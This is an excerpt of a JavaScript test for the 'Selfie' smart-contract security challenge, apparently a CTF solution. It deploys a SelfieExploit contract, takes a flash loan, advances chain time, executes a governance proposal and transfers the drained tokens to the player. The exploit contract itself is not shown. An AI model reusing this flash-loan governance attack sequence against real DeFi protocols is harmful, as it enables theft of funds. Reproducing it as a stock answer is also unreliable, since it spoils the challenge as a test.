...
describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool,Exploit;
    ...
    it('Execution', async function () {
        ...
        Exploit = await (await ethers.getContractFactory('SelfieExploit', deployer)).deploy(governance.address,pool.address,token.address);
        await Exploit.executeFlashLoan();
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
        await Exploit.executeproposal();
        await Exploit.transferAmount(player.address);
    });
